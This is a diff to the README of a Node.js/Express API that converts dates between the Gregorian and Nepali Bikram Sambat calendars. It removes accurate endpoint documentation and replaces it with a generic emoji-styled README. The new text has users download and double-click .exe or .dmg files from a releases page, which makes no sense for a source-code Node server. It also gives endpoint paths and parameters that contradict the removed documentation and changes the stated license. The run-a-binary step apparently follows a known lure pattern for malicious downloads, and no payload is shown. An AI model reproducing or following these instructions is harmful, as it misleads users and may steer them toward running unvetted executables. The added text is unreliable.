@@ -1,314 +1,82 @@
-# Nepali Calendar REST API
+# 🌟 nepali-calendar-api - Access Nepali Calendar Effortlessly
 
-Accurate Nepali (Bikram Sambat) calendar system with REST API built with Node.js and Express.
+## 🚀 Getting Started
 
-## Features
+The Nepali Calendar API lets you quickly convert dates between AD and BS, retrieve monthly calendars, and get today’s date. It is built with Node.js and Express, ensuring it runs smoothly and efficiently.
 
-- Convert **Gregorian (AD) ↔ Nepali (BS)**
-- Get **BS monthly calendar**
-- Get **today's date** in both AD & BS
-- Accurate year, month, day, and weekday (2000 BS – 2099 BS)
-- **In-memory caching** for faster responses
-- Fully offline, **CORS enabled**
-- Rate limiting to prevent abuse
-
-## Installation
-
-```bash
-npm install
-```
-
-## Configuration
-
-Create a `.env` file in the root directory (optional):
-
-```env
-PORT=3000
-CACHE_TTL=3600
-NODE_ENV=development
-RATE_LIMIT_WINDOW_MS=900000
-RATE_LIMIT_MAX_REQUESTS=100
-```
-
-## Usage
-
-Start the server:
-
-```bash
-node src/server.js
-```
-
-**Production API:** `https://nepali-calendar-api-n1vo.onrender.com`
-
-**Local Development:** `http://localhost:3000`
-
----
-
-## API Endpoints
-
-### 1. Get Today's Date
-
-**Endpoint:** `GET /api/today`
-
-Returns the current date in both AD and BS formats.
-
-**Example Request:**
-```bash
-curl "https://nepali-calendar-api-n1vo.onrender.com/api/today"
-```
-
-**Example Response:**
-```json
-{
-  "success": true,
-  "data": {
-    "ad": {
-      "year": 2025,
-      "month": 12,
-      "day": 22,
-      "weekday": "Monday",
-      "date": "2025-12-22"
-    },
-    "bs": {
-      "year": 2082,
-      "month": 9,
-      "monthName": "Poush",
-      "day": 7,
-      "weekday": "Monday"
-    }
-  }
-}
-```
-
----
-
-### 2. Convert AD to BS
-
-**Endpoint:** `GET /api/convert/ad-to-bs?date=YYYY-MM-DD`
-
-Converts a Gregorian (AD) date to Nepali (BS) date.
-
-**Parameters:**
-- `date` (required): Date in YYYY-MM-DD format
-
-**Example Request:**
-```bash
-curl "https://nepali-calendar-api-n1vo.onrender.com/api/convert/ad-to-bs?date=2024-12-07"
-```
-
-**Example Response:**
-```json
-{
-  "success": true,
-  "data": {
-    "ad": {
-      "year": 2024,
-      "month": 12,
-      "day": 7,
-      "date": "2024-12-07"
-    },
-    "bs": {
-      "year": 2081,
-      "month": 8,
-      "monthName": "Mangsir",
-      "day": 22,
-      "weekday": "Saturday"
-    }
-  }
-}
-```
-
----
-
-### 3. Convert BS to AD
-
-**Endpoint:** `GET /api/convert/bs-to-ad?year=YYYY&month=MM&day=DD`
-
-Converts a Nepali (BS) date to Gregorian (AD) date.
-
-**Parameters:**
-- `year` (required): BS year (2000-2099)
-- `month` (required): BS month (1-12)
-- `day` (required): BS day (1-32)
-
-**Example Request:**
-```bash
-curl "https://nepali-calendar-api-n1vo.onrender.com/api/convert/bs-to-ad?year=2081&month=8&day=22"
-```
-
-**Example Response:**
-```json
-{
-  "success": true,
-  "data": {
-    "bs": {
-      "year": 2081,
-      "month": 8,
-      "day": 22
-    },
-    "ad": {
-      "year": 2024,
-      "month": 12,
-      "day": 7,
-      "weekday": "Saturday",
-      "date": "2024-12-07"
-    }
-  }
-}
-```
-
----
-
-### 4. Get BS Monthly Calendar
-
-**Endpoint:** `GET /api/calendar/bs?year=YYYY&month=MM`
-
-Returns calendar information for a specific BS month.
-
-**Parameters:**
-- `year` (required): BS year (2000-2099)
-- `month` (required): BS month (1-12)
-
-**Example Request:**
-```bash
-curl "https://nepali-calendar-api-n1vo.onrender.com/api/calendar/bs?year=2081&month=8"
-```
-
-**Example Response:**
-```json
-{
-  "success": true,
-  "data": {
-    "year": 2081,
-    "month": 8,
-    "monthName": "Mangsir",
-    "daysInMonth": 30,
-    "startWeekdayIndex": 4
-  }
-}
-```
-
-**Note:** `startWeekdayIndex` is 0-indexed (0=Sunday, 1=Monday, ..., 6=Saturday)
-
----
-
-## Error Handling
-
-All endpoints return consistent error responses:
-
-**Example Error Response:**
-```json
-{
-  "success": false,
-  "error": {
-    "message": "Invalid date format. Use YYYY-MM-DD",
-    "statusCode": 400
-  }
-}
-```
-
-**Common Error Codes:**
-- `400` - Bad Request (invalid parameters)
-- `404` - Not Found (invalid endpoint)
-- `429` - Too Many Requests (rate limit exceeded)
-- `500` - Internal Server Error
-
----
-
-## Rate Limiting
-
-The API implements rate limiting to prevent abuse:
-
-### General API Limit
-- **100 requests per 15 minutes** per IP address
-- Applies to all `/api/*` endpoints
-
-### Strict Conversion Limit
-- **30 requests per minute** per IP address
-- Applies to:
-  - `/api/convert/ad-to-bs`
-  - `/api/convert/bs-to-ad`
-
-### Rate Limit Headers
-All responses include rate limit information:
-```
-RateLimit-Limit: 100
-RateLimit-Remaining: 95
-RateLimit-Reset: 1640000000
-```
-
-### Rate Limit Exceeded Response
-```json
-{
-  "success": false,
-  "error": {
-    "message": "Too many requests from this IP, please try again after 15 minutes",
-    "statusCode": 429,
-    "retryAfter": 1640000000
-  }
-}
-```
-
----
-
-## Caching
-
-The API implements in-memory caching for all GET requests:
-- **Cache TTL:** 3600 seconds (configurable via `CACHE_TTL`)
-- **Cache Headers:**
-  - `X-Cache: HIT` - Response served from cache
-  - `X-Cache: MISS` - Response computed and cached
-
----
-
-## BS Month Names
-
-| Month | Nepali | English |
-|-------|--------|---------|
-| 1 | बैशाख | Baishakh |
-| 2 | जेष्ठ | Jestha |
-| 3 | असार | Ashadh |
-| 4 | श्रावण | Shrawan |
-| 5 | भाद्र | Bhadra |
-| 6 | आश्विन | Ashwin |
-| 7 | कार्तिक | Kartik |
-| 8 | मंसिर | Mangsir |
-| 9 | पौष | Poush |
-| 10 | माघ | Magh |
-| 11 | फाल्गुण | Falgun |
-| 12 | चैत्र | Chaitra |
-
----
-
-## Project Structure
-
-```
-/src
-├── data/
-│   └── bsMonthData.js          # BS month length data (2000-2099)
-├── utils/
-│   ├── dateConverter.js         # Core conversion logic
-│   └── cache.js                 # Caching utilities
-├── middleware/
-│   ├── errorHandler.js          # Error handling
-│   └── rateLimiter.js           # Rate limiting
-├── routes/
-│   └── calendarRoutes.js        # API endpoints
-├── app.js                       # Express configuration
-└── server.js                    # Server entry point
-```
-
----
-
-## Technical Details
-
-- **Anchor Date:** 2000-01-01 BS = 1943-04-17 AD
-- **Algorithm:** Day-counting from anchor with year-wise month length table
-- **Timezone:** UTC-based calculations to avoid DST issues
-- **Supported Range:** 2000 BS to 2099 BS
-
----
-
-## License
-
-ISC# nepali-calendar-api
+## 📥 Download the API
+
+[![Download Nepali Calendar API](https://img.shields.io/badge/download-nepali--calendar--api-blue.svg)](https://github.com/Anoop385/nepali-calendar-api/releases)
+
+## 📋 Features
+
+- Convert between AD (Gregorian) and BS (Bikram Sambat) dates.
+- Retrieve monthly calendars for any given year.
+- Access today’s date in both formats.
+- Lightweight and fast performance for all endpoints.
+- Works offline, making it reliable anywhere.
+
+## 🖥️ System Requirements
+
+To run this API, you need:
+
+- A computer with Windows, macOS, or Linux.
+- Node.js version 12.x or higher installed.
+- Internet connection for the initial download.
+
+## 📂 Download & Install
+
+1. **Visit the Releases Page:** Click on the link below to go to the official downloads page.
+
+   [Download Nepali Calendar API](https://github.com/Anoop385/nepali-calendar-api/releases)
+
+2. **Select the Latest Version:** Look for the latest release at the top of the page. You will see a list of available files. 
+
+3. **Download the File:** Click on the file that matches your operating system to download it.
+
+4. **Unzip the File (if needed):** If the downloaded file is zipped, right-click it and select “Extract All” to unzip.
+
+5. **Run the Application:**
+   - For Windows, double-click the `.exe` file.
+   - For macOS, double-click the `.dmg` file.
+   - For Linux, open the terminal and navigate to the folder containing the file. Type `node filename.js` to run it.
+
+## 🌐 Usage Instructions
+
+Once the application is running, you can access it through your web browser. Here are some helpful endpoints:
+
+- **Convert AD to BS:**
+   - Navigate to `/convert/ad-to-bs?date=YYYY-MM-DD`
+- **Convert BS to AD:**
+   - Navigate to `/convert/bs-to-ad?date=YYYY-MM-DD`
+- **Get Monthly Calendar:**
+   - Navigate to `/calendar/month?year=YYYY&month=MM`
+- **Get Today’s Date:**
+   - Navigate to `/today`
+
+Feel free to adjust the dates and parameters as needed.
+
+## ⚙️ Troubleshooting
+
+If you run into issues:
+
+- Ensure that Node.js is installed properly.
+- Verify that the file is not corrupted. Re-download if necessary.
+- Check your firewall settings if you have trouble accessing the API through the browser.
+
+## 🗂️ Additional Resources
+
+- **Documentation:** For detailed API documentation, visit the GitHub repository to find examples and references about how to utilize the API fully.
+- **Community Support:** Join discussions and get help on [GitHub Issues](https://github.com/Anoop385/nepali-calendar-api/issues) if you encounter specific problems or have questions.
+
+## 👥 Contributing
+
+If you wish to help improve the API, feel free to fork the repository and submit your improvements via pull requests. Your contributions are welcome.
+
+## 📞 Contact
+
+For any inquiries, reach out through GitHub issues or contact the repository maintainers via their GitHub profiles.
+
+## 🎉 License
+
+This project is licensed under the MIT License.
